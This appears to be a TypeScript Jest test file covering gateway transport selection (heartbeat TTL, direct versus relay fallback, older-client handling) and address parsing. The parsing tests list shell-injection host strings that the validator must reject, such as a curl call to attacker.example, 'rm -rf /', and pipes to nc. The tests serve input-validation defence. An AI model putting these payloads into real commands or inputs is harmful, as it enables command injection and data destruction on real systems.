import { GatewayTransport, HEARTBEAT_BUFFER_SECONDS } from "./gateway-v2-constants";
import {
  isTransportHealthy,
  parseDirectAddress,
  resolveClientTransports,
  resolveTransports
} from "./gateway-v2-transport-fns";

const secondsAgo = (seconds: number) => new Date(Date.now() - seconds * 1000);
const TTL = 180;
const fresh = secondsAgo(TTL - 60);
const stale = secondsAgo(TTL + HEARTBEAT_BUFFER_SECONDS + 60);

describe("isTransportHealthy", () => {
  test("a never-probed transport is usable, so a freshly registered gateway is not locked out", () => {
    expect(isTransportHealthy({ probedAt: null, heartbeatTTL: TTL })).toBe(true);
    expect(isTransportHealthy({ probedAt: undefined, heartbeatTTL: TTL })).toBe(true);
  });

  test("a probe inside the TTL window is usable", () => {
    expect(isTransportHealthy({ probedAt: fresh, heartbeatTTL: TTL })).toBe(true);
  });

  test("the buffer extends the window, so a probe that is barely late still counts", () => {
    expect(isTransportHealthy({ probedAt: secondsAgo(TTL + HEARTBEAT_BUFFER_SECONDS - 5), heartbeatTTL: TTL })).toBe(
      true
    );
  });

  test("a probe past the TTL plus buffer is stale", () => {
    expect(isTransportHealthy({ probedAt: stale, heartbeatTTL: TTL })).toBe(false);
  });

  test("TTL 0 is the kill switch set when every transport fails, so nothing is usable", () => {
    expect(isTransportHealthy({ probedAt: new Date(), heartbeatTTL: 0 })).toBe(false);
    expect(isTransportHealthy({ probedAt: null, heartbeatTTL: 0 })).toBe(false);
  });
});

describe("resolveTransports", () => {
  const direct = { directAddress: "gw.internal:8443", relayId: null, heartbeatTTL: TTL };
  const relay = { directAddress: null, relayId: "relay-1", heartbeatTTL: TTL };
  const dual = { directAddress: "gw.internal:8443", relayId: "relay-1", heartbeatTTL: TTL };

  test("a direct-only gateway dials direct", () => {
    expect(resolveTransports({ gateway: { ...direct, directHeartbeat: fresh } })).toEqual({
      useDirect: true,
      useRelay: false,
      hasTransport: true
    });
  });

  test("a direct-only gateway still dials direct on a stale probe, since there is nothing else", () => {
    expect(resolveTransports({ gateway: { ...direct, directHeartbeat: stale } })).toMatchObject({
      useDirect: true,
      hasTransport: true
    });
  });

  test("a relay-only gateway dials the relay", () => {
    expect(resolveTransports({ gateway: { ...relay, directHeartbeat: null } })).toEqual({
      useDirect: false,
      useRelay: true,
      hasTransport: true
    });
  });

  test("a gateway with neither transport has nothing to dial", () => {
    expect(
      resolveTransports({ gateway: { directAddress: null, relayId: null, heartbeatTTL: null, directHeartbeat: null } })
    ).toMatchObject({ hasTransport: false });
  });

  // Covers a real bug: a dual gateway got direct with no relay credentials, so it could not fall back.
  test("a healthy dual gateway prefers direct but carries relay credentials for the fallback", () => {
    expect(resolveTransports({ gateway: { ...dual, directHeartbeat: fresh } })).toEqual({
      useDirect: true,
      useRelay: true,
      hasTransport: true
    });
  });

  test("a dual gateway whose direct probe went stale drops to the relay", () => {
    expect(resolveTransports({ gateway: { ...dual, directHeartbeat: stale } })).toEqual({
      useDirect: false,
      useRelay: true,
      hasTransport: true
    });
  });

  test("a dual gateway not yet probed on direct still tries it, and keeps the relay in reserve", () => {
    expect(resolveTransports({ gateway: { ...dual, directHeartbeat: null } })).toEqual({
      useDirect: true,
      useRelay: true,
      hasTransport: true
    });
  });

  describe("an explicit transport is honoured, because a health probe has to target one path", () => {
    test("direct is used even when its own probe is stale", () => {
      expect(
        resolveTransports({ gateway: { ...dual, directHeartbeat: stale }, transport: GatewayTransport.Direct })
      ).toEqual({
        useDirect: true,
        useRelay: false,
        hasTransport: true
      });
    });

    test("relay is used even when direct is healthy", () => {
      expect(
        resolveTransports({ gateway: { ...dual, directHeartbeat: fresh }, transport: GatewayTransport.Relay })
      ).toEqual({
        useDirect: false,
        useRelay: true,
        hasTransport: true
      });
    });

    test("asking for direct on a relay-only gateway leaves nothing to dial", () => {
      expect(
        resolveTransports({ gateway: { ...relay, directHeartbeat: null }, transport: GatewayTransport.Direct })
      ).toMatchObject({
        useDirect: false,
        hasTransport: false
      });
    });
  });

  test("the TTL kill switch drops a dual gateway to its relay", () => {
    expect(resolveTransports({ gateway: { ...dual, directHeartbeat: fresh, heartbeatTTL: 0 } })).toEqual({
      useDirect: false,
      useRelay: true,
      hasTransport: true
    });
  });
});

describe("resolveClientTransports", () => {
  const direct = { directAddress: "gw.internal:8443", relayId: null, heartbeatTTL: TTL };
  const relay = { directAddress: null, relayId: "relay-1", heartbeatTTL: TTL };
  const dual = { directAddress: "gw.internal:8443", relayId: "relay-1", heartbeatTTL: TTL };

  test("browser access omits the list and takes whatever the gateway has", () => {
    expect(resolveClientTransports({ gateway: { ...dual, directHeartbeat: fresh } })).toMatchObject({
      useDirect: true,
      useRelay: true
    });
  });

  // Covers a real bug: direct went out on client capability alone, so every session paid the timeout.
  test("a stale direct probe is skipped when the relay can take over", () => {
    expect(
      resolveClientTransports({
        gateway: { ...dual, directHeartbeat: stale },
        supportedTransports: [GatewayTransport.Direct, GatewayTransport.Relay]
      })
    ).toMatchObject({ useDirect: false, useRelay: true, hasTransport: true });
  });

  test("a stale direct probe is still used when it is the only path the client has", () => {
    expect(
      resolveClientTransports({
        gateway: { ...direct, directHeartbeat: stale },
        supportedTransports: [GatewayTransport.Direct]
      })
    ).toMatchObject({ useDirect: true, useRelay: false, hasTransport: true });
  });

  test("a stale direct probe is still used when the client cannot dial the relay", () => {
    expect(
      resolveClientTransports({
        gateway: { ...dual, directHeartbeat: stale },
        supportedTransports: [GatewayTransport.Direct]
      })
    ).toMatchObject({ useDirect: true, useRelay: false, hasTransport: true });
  });

  test("an empty list is an older CLI, which gets the relay and never the direct address", () => {
    expect(
      resolveClientTransports({ gateway: { ...dual, directHeartbeat: fresh }, supportedTransports: [] })
    ).toMatchObject({ useDirect: false, useRelay: true, hasTransport: true });
  });

  test("an older CLI against a direct-only gateway is told to upgrade rather than given nothing", () => {
    expect(
      resolveClientTransports({ gateway: { ...direct, directHeartbeat: fresh }, supportedTransports: [] })
    ).toMatchObject({ hasTransport: false, isDirectOnlyForOlderClient: true, gatewayHasTransport: true });
  });

  test("a relay-only gateway serves an older CLI", () => {
    expect(
      resolveClientTransports({ gateway: { ...relay, directHeartbeat: null }, supportedTransports: [] })
    ).toMatchObject({ useDirect: false, useRelay: true, isDirectOnlyForOlderClient: false });
  });

  test("a gateway with no transport is reported as such, not as a client problem", () => {
    expect(
      resolveClientTransports({
        gateway: { directAddress: null, relayId: null, directHeartbeat: null, heartbeatTTL: TTL }
      })
    ).toMatchObject({ hasTransport: false, gatewayHasTransport: false, isDirectOnlyForOlderClient: false });
  });

  test("the TTL kill switch drops a dual gateway to its relay", () => {
    expect(resolveClientTransports({ gateway: { ...dual, directHeartbeat: fresh, heartbeatTTL: 0 } })).toMatchObject({
      useDirect: false,
      useRelay: true
    });
  });
});

describe("parseDirectAddress", () => {
  test.each([
    ["gateway.internal:8443", "gateway.internal", 8443],
    ["gateway-1.corp.example.com:8443", "gateway-1.corp.example.com", 8443],
    ["10.0.4.7:8443", "10.0.4.7", 8443],
    ["[fd00::1]:8443", "fd00::1", 8443],
    ["localhost:8443", "localhost", 8443],
    ["gw.internal.:8443", "gw.internal.", 8443],
    ["gw.internal:1", "gw.internal", 1],
    ["gw.internal:65535", "gw.internal", 65535]
  ])("accepts %s", (address, host, port) => {
    expect(parseDirectAddress(address)).toEqual({ host, port });
  });

  // These reach copy-and-run deploy commands, and the URL parser alone accepts every one of them.
  /* eslint-disable no-template-curly-in-string -- ${IFS} is literal payload text, not interpolation */
  test.each([
    "$(curl${IFS}attacker.example).x:8443",
    "foo$(curl${IFS}evil):8443",
    "foo`id`:8443",
    "$(id):8443",
    "gw;rm -rf /:8443",
    "gw&&curl x:8443",
    "gw|nc x 1:8443",
    "-leading.example.com:8443",
    "trailing-.example.com:8443",
    "under_score.example.com:8443"
  ])("rejects the shell-unsafe host in %s", (address) => {
    expect(() => parseDirectAddress(address)).toThrow();
  });
  /* eslint-enable no-template-curly-in-string */

  test.each([
    "gateway.internal",
    "gw.internal:0",
    "gw.internal:99999",
    ":8443",
    "gw.internal:8443/x",
    "gw.internal:8443?a=b"
  ])("rejects the malformed address %s", (address) => {
    expect(() => parseDirectAddress(address)).toThrow();
  });

  test("never echoes the address, which can arrive shaped like a connection string", () => {
    let message = "";
    try {
      parseDirectAddress("user:hunter2@example.com:8443");
    } catch (err) {
      message = err instanceof Error ? err.message : String(err);
    }
    expect(message).not.toBe("");
    expect(message).not.toContain("hunter2");
  });
});
